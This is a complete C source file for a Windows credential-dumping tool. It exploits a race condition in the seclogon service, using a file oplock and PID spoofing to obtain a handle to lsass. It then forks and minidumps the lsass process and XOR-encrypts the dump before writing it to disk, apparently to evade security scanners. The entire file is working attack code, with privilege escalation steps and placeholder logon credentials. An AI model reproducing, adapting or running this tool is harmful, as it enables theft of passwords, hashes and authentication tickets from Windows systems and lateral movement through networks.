#include <Windows.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdio.h>
#include <string.h>

#include "Structs.h"

#pragma comment (lib, "Dbghelp.lib")

#define SECLOGON_PATH   L"\\WINDOWS\\system32\\seclogon.dll"
#define FILE_TO_LOCK    L"\\WINDOWS\\System32\\license.rtf"

// CHANGE:
#define LOGON_USERNAME  L"k4rm4n14"
#define LOGON_DOMAIN    L"k4rm4n14C_DOMAIN"
#define LOGON_PASSWORD  L"k4rm4n14_PASS"

#define XOR_KEY "K4rm4ishere"
#define XOR_KEY_LEN 11

typedef struct _THREAD_PARM {
    DWORD   dwProcessPid;
    LPWSTR  szCmndLine;
} THREAD_PARM, * PTHREAD_PARM;

typedef struct _MINIDUMP_CALLBACK_PARM {
    LPVOID  pDumpedBuffer;
    DWORD   dwDumpedBufferSize;
} MINIDUMP_CALLBACK_PARM, * PMINIDUMP_CALLBACK_PARM;

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* pRtlCompareUnicodeString)(_In_ PUNICODE_STRING String1, _In_ PUNICODE_STRING String2, _In_ BOOLEAN CaseInSensitive);
typedef NTSTATUS(NTAPI* fnRtlCompareUnicodeString)(IN PUNICODE_STRING String1, IN PUNICODE_STRING String2, IN BOOLEAN CaseInSensitive);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryInformationFile)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);

#define ONE_KB              1024
#define ARRAY_SIZE          (ONE_KB * 8)
#define MAX_LSASS_DMP_SIZE  314572800

BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {

    TOKEN_PRIVILEGES    TokenPrivs = { 0x00 };
    LUID                Luid = { 0x00 };

    if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
        printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    TokenPrivs.PrivilegeCount = 0x01;
    TokenPrivs.Privileges[0].Luid = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        return FALSE;
    }

    return TRUE;
}

BOOL WriteFileToDiskW(IN LPCWSTR szFileName, IN PBYTE pFileBuffer, OUT DWORD dwFileSize) {

    HANDLE      hFile = INVALID_HANDLE_VALUE;
    DWORD       dwNumberOfBytesWritten = 0x00;

    if (!szFileName || !pFileBuffer || !dwFileSize)
        goto _END_OF_FUNC;

    if ((hFile = CreateFileW(szFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
        printf("[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesWritten, dwFileSize);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
}

DWORD GetPidUsingFilePath(IN LPWSTR szProcessBinaryPath) {

    NTSTATUS                    STATUS = STATUS_SUCCESS;
    DWORD                       dwReturnProcessId = 0x00;
    HANDLE                      hFile = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK             IoStatusBlock = { 0 };
    PFILE_PROCESS_INFO          pFileProcIdInfo = NULL;
    ULONG                       uFileProcIdInfoSize = ARRAY_SIZE;
    fnNtQueryInformationFile    pNtQueryInformationFile = NULL;

    if (!(pNtQueryInformationFile = (fnNtQueryInformationFile)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationFile"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hFile = CreateFileW(szProcessBinaryPath, FILE_READ_ATTRIBUTES, (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), NULL, OPEN_EXISTING, 0x00, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pFileProcIdInfo = (PFILE_PROCESS_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uFileProcIdInfoSize))) {
        printf("[!] HeapAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if ((STATUS = pNtQueryInformationFile(hFile, &IoStatusBlock, pFileProcIdInfo, uFileProcIdInfoSize, FileProcessIdsUsingFileInformation)) != STATUS_SUCCESS) {

        while (STATUS == STATUS_INFO_LENGTH_MISMATCH) {

            uFileProcIdInfoSize += ARRAY_SIZE;

            if (!(pFileProcIdInfo = (PFILE_PROCESS_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pFileProcIdInfo, uFileProcIdInfoSize))) {
                printf("[!] HeapReAlloc Failed With Error: %d \n", GetLastError());
                goto _END_OF_FUNC;
            }

            STATUS = pNtQueryInformationFile(hFile, &IoStatusBlock, pFileProcIdInfo, uFileProcIdInfoSize, FileProcessIdsUsingFileInformation);
        }

        if (STATUS != STATUS_SUCCESS) {
            printf("[!] NtQueryInformationFile Failed With Error: 0x%0.8X \n", STATUS);
            goto _END_OF_FUNC;
        }
    }

    if (pFileProcIdInfo->NumberOfProcessIdsInList >= 1)
        dwReturnProcessId = pFileProcIdInfo->ProcessIdList[0];

_END_OF_FUNC:
    if (pFileProcIdInfo)
        HeapFree(GetProcessHeap(), 0x00, pFileProcIdInfo);
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    return dwReturnProcessId;
}

VOID PatchCurrentProcessID(IN DWORD dwNewPid, OUT OPTIONAL DWORD* pdwOldPid) {

    if (pdwOldPid)
        *pdwOldPid = HandleToUlong(((PTEB)__readgsqword(0x30))->ClientId.UniqueProcess);

    *(DWORD*)&((PTEB)__readgsqword(0x30))->ClientId.UniqueProcess = dwNewPid;
}

BOOL FindHandlesInProcess(IN DWORD dwProcessId, IN PUNICODE_STRING pusProcessTypeName, IN OUT PHANDLE phHandlesArray, IN OUT PDWORD pdwHandleArrayLength) {

    BOOL                            bResult = FALSE;
    NTSTATUS                        STATUS = 0x00;
    PSYSTEM_HANDLE_INFORMATION      pSysHandleInfo = NULL;
    ULONG_PTR                       uTmpBuffer = NULL;
    DWORD                           dwSysHandleInfoSize = (ONE_KB * 64),
        dwTmpBufferLength = (ONE_KB * 4);
    POBJECT_TYPES_INFORMATION       ObjectTypesInfo = NULL;
    POBJECT_TYPE_INFORMATION_V2     CurrentObjType = NULL;
    ULONG                           uProcessTypeIndex = 0x00;
    fnNtQuerySystemInformation      pNtQuerySystemInformation = NULL;
    fnRtlCompareUnicodeString       pRtlCompareUnicodeString = NULL;
    fnNtQueryObject                 pNtQueryObject = NULL;

    if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(pRtlCompareUnicodeString = (fnRtlCompareUnicodeString)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlCompareUnicodeString"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(pNtQueryObject = (fnNtQueryObject)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryObject"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    do {

        if (!(uTmpBuffer = LocalAlloc(LPTR, dwTmpBufferLength))) {
            printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            return FALSE;
        }

        if ((STATUS = pNtQueryObject(NULL, ObjectTypesInformation, uTmpBuffer, dwTmpBufferLength, &dwTmpBufferLength)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
            printf("[!] pNtQueryObject Failed With Error: 0x%0.8X \n", STATUS);
            return FALSE;
        }

        if (STATUS == STATUS_SUCCESS) {
            ObjectTypesInfo = (POBJECT_TYPES_INFORMATION)uTmpBuffer;
            break;
        }

        LocalFree(uTmpBuffer);

    } while (STATUS == STATUS_INFO_LENGTH_MISMATCH);

    if (!ObjectTypesInfo)
        return FALSE;

    CurrentObjType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypesInfo);

    for (ULONG i = 0; i < ObjectTypesInfo->NumberOfTypes; i++) {
        if (pRtlCompareUnicodeString(pusProcessTypeName, &CurrentObjType->TypeName, TRUE) == 0) {
            uProcessTypeIndex = i + 2;
            break;
        }
        CurrentObjType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentObjType);
    }

    if (!uProcessTypeIndex)
        return FALSE;

    if (!(pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, dwSysHandleInfoSize))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    while ((STATUS = pNtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, dwSysHandleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalReAlloc(pSysHandleInfo, dwSysHandleInfoSize *= 2, LMEM_MOVEABLE);

    for (ULONG i = 0; i < pSysHandleInfo->HandleCount; i++) {
        if (pSysHandleInfo->Handles[i].ObjectTypeIndex == uProcessTypeIndex && pSysHandleInfo->Handles[i].UniqueProcessId == dwProcessId) {
            phHandlesArray[*pdwHandleArrayLength] = (HANDLE)pSysHandleInfo->Handles[i].HandleValue;
            *pdwHandleArrayLength = *pdwHandleArrayLength + 1;
        }
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (uTmpBuffer)
        LocalFree(uTmpBuffer);
    if (pSysHandleInfo)
        LocalFree(pSysHandleInfo);
    return bResult;
}

DWORD WINAPI ThreadSeclogonLock(IN LPVOID lpParameter) {

    DWORD                   dwReturnCode = 0x00;
    PTHREAD_PARM            pThreadParm = (PTHREAD_PARM)lpParameter;
    PROCESS_INFORMATION     ProcessInfo = { 0 };
    STARTUPINFO             StartupInfo = { 0 };
    UNICODE_STRING          usProcessTypeName = RTL_CONSTANT_STRING(L"Token");
    DWORD                   dwCurrentOriginalPid = 0x00,
        dwTokenHandlesCount = 0x00;
    PHANDLE                 hTokenHandlesArray = NULL;
    BOOL                    bUseCreateProcessWithToken = FALSE,
        bProcessCreatedWithToken = FALSE;

    if (!(hTokenHandlesArray = LocalAlloc(LPTR, ARRAY_SIZE))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    printf("[i] Replacing Current Process ID With %d... ", pThreadParm->dwProcessPid);
    PatchCurrentProcessID(pThreadParm->dwProcessPid, &dwCurrentOriginalPid);
    printf("[+] DONE \n");

    if (!FindHandlesInProcess(pThreadParm->dwProcessPid, &usProcessTypeName, hTokenHandlesArray, &dwTokenHandlesCount))
        goto _END_OF_FUNC;

    if (dwTokenHandlesCount > 1)
        bUseCreateProcessWithToken = TRUE;
    else
        printf("[-] No Token Handles Found In The %d Process, Using CreateProcessWithLogonW \n", pThreadParm->dwProcessPid);

    if (bUseCreateProcessWithToken) {
        printf("[i] %d Tokens Detected, Using CreateProcessWithTokenW \n", dwTokenHandlesCount);
        for (DWORD i = 0; i < dwTokenHandlesCount; i++) {
            if (CreateProcessWithTokenW(hTokenHandlesArray[i], 0x00, NULL, pThreadParm->szCmndLine, 0x00, NULL, NULL, &StartupInfo, &ProcessInfo)) {
                bProcessCreatedWithToken = TRUE;
                break;
            }
        }
    }

    if (bUseCreateProcessWithToken && !bProcessCreatedWithToken)
        printf("[i] CreateProcessWithTokenW Failed, Using CreateProcessWithLogonW Instead \n");

    if (!bUseCreateProcessWithToken || (bUseCreateProcessWithToken && !bProcessCreatedWithToken)) {
        if (!CreateProcessWithLogonW(LOGON_USERNAME, LOGON_DOMAIN, LOGON_PASSWORD, LOGON_NETCREDENTIALS_ONLY, NULL, pThreadParm->szCmndLine, 0x00, NULL, NULL, &StartupInfo, &ProcessInfo)) {
            printf("[!] CreateProcessWithLogonW Failed With Error: %d \n", GetLastError());
            goto _END_OF_FUNC;
        }
    }

    printf("[+] Created Spoofed Process Of PID: %d \n", ProcessInfo.dwProcessId);

_END_OF_FUNC:
    if (hTokenHandlesArray)
        LocalFree(hTokenHandlesArray);
    if (dwCurrentOriginalPid)
        PatchCurrentProcessID(dwCurrentOriginalPid, NULL);
    if (ProcessInfo.hProcess)
        CloseHandle(ProcessInfo.hProcess);
    if (ProcessInfo.hThread)
        CloseHandle(ProcessInfo.hThread);
    return dwReturnCode;
}

BOOL CreateFileLock(IN HANDLE hFile, IN LPOVERLAPPED pOverLapped) {

    REQUEST_OPLOCK_INPUT_BUFFER     ReqOplockInput = { 0x00 };
    REQUEST_OPLOCK_OUTPUT_BUFFER    ReqOplockOutput = { 0x00 };

    ReqOplockInput.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    ReqOplockInput.StructureLength = sizeof(REQUEST_OPLOCK_INPUT_BUFFER);
    ReqOplockInput.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
    ReqOplockInput.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;

    ReqOplockOutput.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    ReqOplockOutput.StructureLength = sizeof(REQUEST_OPLOCK_OUTPUT_BUFFER);

    if (!DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK, &ReqOplockInput, sizeof(ReqOplockInput), &ReqOplockOutput, sizeof(ReqOplockOutput), NULL, pOverLapped) && GetLastError() != ERROR_IO_PENDING) {
        printf("[!] DeviceIoControl Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL LeakLsassHandleWithRaceCondition(IN DWORD dwLsassPid) {

    BOOL                bResult = FALSE;
    OVERLAPPED          OverLapped = { 0x00 };
    THREAD_PARM         ThreadParm = { .dwProcessPid = dwLsassPid, .szCmndLine = FILE_TO_LOCK };
    HANDLE              hFile = INVALID_HANDLE_VALUE,
        hThread = NULL;
    DWORD               dwNmbrOfBytesTrnsfrd = 0x00;

    if ((hFile = CreateFileW(FILE_TO_LOCK, FILE_GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(OverLapped.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL))) {
        printf("[!] CreateEventW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!CreateFileLock(hFile, &OverLapped))
        goto _END_OF_FUNC;

    if (!(hThread = CreateThread(NULL, 0x00, ThreadSeclogonLock, &ThreadParm, 0x00, NULL))) {
        printf("[!] CreateThread [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetOverlappedResult(hFile, &OverLapped, &dwNmbrOfBytesTrnsfrd, TRUE)) {
        printf("[!] GetOverlappedResult Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[*] Seclogon Thread Locked !\n");
    printf("[i] An Lsass Handle Will Be Available Within The Seclogon Process\n");

    bResult = TRUE;

_END_OF_FUNC:
    if (hThread)
        CloseHandle(hThread);
    return bResult;
}

BOOL ForkRemoteProcess(OUT HANDLE* phLsassHandle, IN HANDLE hDuplicatedHandle) {

    NTSTATUS                STATUS = STATUS_SUCCESS;
    fnNtCreateProcessEx     pNtCreateProcessEx = NULL;

    if (!(pNtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtCreateProcessEx"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtCreateProcessEx(phLsassHandle, MAXIMUM_ALLOWED, NULL, hDuplicatedHandle, 0x1001, NULL, NULL, NULL, 0x00)) != STATUS_SUCCESS) {
        printf("[!] NtCreateProcessEx Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return *phLsassHandle == NULL ? FALSE : TRUE;
}

BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {

    PMINIDUMP_CALLBACK_PARM     pMiniDumpParm = (PMINIDUMP_CALLBACK_PARM)CallbackParam;
    LPVOID                      pSource = NULL,
        pDestination = NULL;
    DWORD                       dwBufferSize = 0x00;

    switch (CallbackInput->CallbackType) {

    case IoStartCallback: {
        CallbackOutput->Status = S_FALSE;
        break;
    }

    case IoWriteAllCallback: {
        CallbackOutput->Status = S_OK;

        pSource = CallbackInput->Io.Buffer;
        pDestination = (LPVOID)((DWORD_PTR)pMiniDumpParm->pDumpedBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
        dwBufferSize = CallbackInput->Io.BufferBytes;

        pMiniDumpParm->dwDumpedBufferSize += dwBufferSize;
        RtlCopyMemory(pDestination, pSource, dwBufferSize);

        break;
    }

    case IoFinishCallback: {
        CallbackOutput->Status = S_OK;
        break;
    }

    default:
        return TRUE;
    }

    return TRUE;
}

void XOREncryptDecrypt(PBYTE data, DWORD dataSize, const char* key, size_t keyLen) {
    for (DWORD i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keyLen];
    }
}

BOOL SeclogonRaceConditionLsassDump(IN DWORD dwLsassPid, IN LPWSTR szDumpPath) {

    BOOL                            bDumped = FALSE;
    DWORD                           dwSecLogonPid = 0x00,
        dwCurrentOriginalPid = 0x00,
        dwProcessHandlesCount = 0x00;
    HANDLE                          hSeclogonProcess = NULL,
        hDuplicatedHandle = NULL,
        hLsassProcess = NULL;
    PHANDLE                         hProcessHandlesArray = NULL;
    UNICODE_STRING                  usProcessTypeName = RTL_CONSTANT_STRING(L"Process");
    MINIDUMP_CALLBACK_INFORMATION   MiniDumpInfo = { 0 };
    MINIDUMP_CALLBACK_PARM          MiniDumpParm = { 0 };
    PROCESS_INFORMATION             ProcessInfo = { 0 };
    STARTUPINFO                     StartupInfo = { 0 };

    if (!(hProcessHandlesArray = (PHANDLE)LocalAlloc(LPTR, ARRAY_SIZE))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(dwSecLogonPid = GetPidUsingFilePath(SECLOGON_PATH))) {

        printf("[-] Seclogon Service Is Not Running \n");

        if (!CreateProcessWithTokenW((HANDLE)-1, 0x00, NULL, L"CMD", 0, NULL, NULL, &StartupInfo, &ProcessInfo) && GetLastError() != ERROR_INVALID_HANDLE) {
            printf("[!] CreateProcessWithTokenW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        printf("[i] Trying To Trigger It By Invoking Process With PID: %d...", ProcessInfo.dwProcessId);

        if (!(dwSecLogonPid = GetPidUsingFilePath(SECLOGON_PATH))) {
            printf("[!] FAILED \n");
            goto _END_OF_FUNC;
        }

        printf("[+] DONE \n");
    }

    printf("[+] Seclogon PID Fetched: %d \n", dwSecLogonPid);

    PatchCurrentProcessID(dwLsassPid, &dwCurrentOriginalPid);

    if (!LeakLsassHandleWithRaceCondition(dwLsassPid)) {
        goto _END_OF_FUNC;
    }

    PatchCurrentProcessID(dwCurrentOriginalPid, NULL);

    if (!FindHandlesInProcess(dwSecLogonPid, &usProcessTypeName, hProcessHandlesArray, &dwProcessHandlesCount) || dwProcessHandlesCount < 1) {
        printf("[-] No Process Handles To Lsass Found In Seclogon \n[!] The Race Condition Didn't Work!\n");
        goto _END_OF_FUNC;

    }

    if (!(hSeclogonProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwSecLogonPid))) {
        printf("[!] OpenProcess Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    for (DWORD i = 0; i < dwProcessHandlesCount; i++) {

        if (!DuplicateHandle(hSeclogonProcess, hProcessHandlesArray[i], (HANDLE)-1, &hDuplicatedHandle, 0x00, FALSE, DUPLICATE_SAME_ACCESS)) {
            printf("[!] DuplicateHandle Failed With Error: %d \n", GetLastError());
            continue;
        }

        printf("[+] Duplicated Handle: 0x%0.8X \n", hDuplicatedHandle);

        if (GetProcessId(hDuplicatedHandle) != dwLsassPid) {
            CloseHandle(hDuplicatedHandle);
            continue;
        }

        printf("[*] Fetched Process Handle To Lsass From Seclogon! \n");

        if (!ForkRemoteProcess(&hLsassProcess, hDuplicatedHandle)) {
            CloseHandle(hDuplicatedHandle);
            break;
        }

        printf("[*] Forked Lsass Process Handle: 0x%0.8X \n", hLsassProcess);

        if (!(MiniDumpParm.pDumpedBuffer = (LPVOID)LocalAlloc(LPTR, MAX_LSASS_DMP_SIZE))) {
            printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            CloseHandle(hDuplicatedHandle);
            CloseHandle(hLsassProcess);
            break;
        }

        MiniDumpInfo.CallbackRoutine = &MinidumpCallbackRoutine;
        MiniDumpInfo.CallbackParam = &MiniDumpParm;

        if (!SetHandleInformation(hLsassProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE)) {
            printf("[!] SetHandleInformation [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            CloseHandle(hDuplicatedHandle);
            CloseHandle(hLsassProcess);
            LocalFree(MiniDumpParm.pDumpedBuffer);
            break;
        }

        if (!(bDumped = MiniDumpWriteDump(hLsassProcess, GetProcessId(hLsassProcess), NULL, MiniDumpWithFullMemory, NULL, NULL, &MiniDumpInfo))) {
            printf("[!] MiniDumpWriteDump Failed With Error: %d \n", GetLastError());
            CloseHandle(hDuplicatedHandle);
            CloseHandle(hLsassProcess);
            LocalFree(MiniDumpParm.pDumpedBuffer);
            break;
        }

        if (!SetHandleInformation(hLsassProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0x00)) {
            printf("[!] SetHandleInformation [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            CloseHandle(hDuplicatedHandle);
            CloseHandle(hLsassProcess);
            LocalFree(MiniDumpParm.pDumpedBuffer);
            break;
        }

        // Encrypt the dump in memory before saving to disk
        XOREncryptDecrypt(MiniDumpParm.pDumpedBuffer, MiniDumpParm.dwDumpedBufferSize, XOR_KEY, XOR_KEY_LEN);
        WriteFileToDiskW(szDumpPath, MiniDumpParm.pDumpedBuffer, MiniDumpParm.dwDumpedBufferSize);

        break;
    }

_END_OF_FUNC:
    if (hSeclogonProcess)
        CloseHandle(hSeclogonProcess);
    if (ProcessInfo.hProcess)
        CloseHandle(ProcessInfo.hProcess);
    if (ProcessInfo.hThread)
        CloseHandle(ProcessInfo.hThread);
    if (dwCurrentOriginalPid)
        PatchCurrentProcessID(dwCurrentOriginalPid, NULL);
    if (hProcessHandlesArray)
        LocalFree(hProcessHandlesArray);
    if (MiniDumpParm.pDumpedBuffer)
        LocalFree(MiniDumpParm.pDumpedBuffer);
    return bDumped;
}

BOOL SeclogonRaceConditionDumpLsass(IN DWORD dwLsassPid, IN LPWSTR szDumpPath) {

    BOOL    bResult = FALSE;
    HANDLE  hCurrentTokenHandle = NULL;

    if (!dwLsassPid || !szDumpPath)
        return FALSE;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
        printf("[!] OpenProcessToken [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!SetPrivilege(hCurrentTokenHandle, SE_DEBUG_NAME))
        goto _END_OF_FUNC;

    if (!SetPrivilege(hCurrentTokenHandle, SE_IMPERSONATE_NAME))
        goto _END_OF_FUNC;

    if (!SeclogonRaceConditionLsassDump(dwLsassPid, szDumpPath))
        goto _END_OF_FUNC;

    printf("[*] Lsass Dumped To %ws \n", szDumpPath);

    bResult = TRUE;

_END_OF_FUNC:
    if (hCurrentTokenHandle)
        CloseHandle(hCurrentTokenHandle);
    return bResult;
}

DWORD GetLsassPid() {
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                    lsassPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return lsassPid;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L"Uso: %s <Ruta de archivo de volcado>\n", argv[0]);
        return 1;
    }

    LPWSTR szDumpPath = argv[1];
    DWORD dwLsassPid = GetLsassPid();

    if (dwLsassPid == 0) {
        wprintf(L"[!] No se pudo obtener el PID del proceso lsass.exe.\n");
        return 1;
    }

    wprintf(L"[*] PID del proceso lsass.exe: %d\n", dwLsassPid);

    if (!SeclogonRaceConditionDumpLsass(dwLsassPid, szDumpPath)) {
        wprintf(L"[!] Error al realizar el volcado del proceso lsass.exe.\n");
        return 1;
    }

    wprintf(L"[+] Volcado del proceso lsass.exe completado exitosamente. Archivo: %s\n", szDumpPath);
    return 0;
}
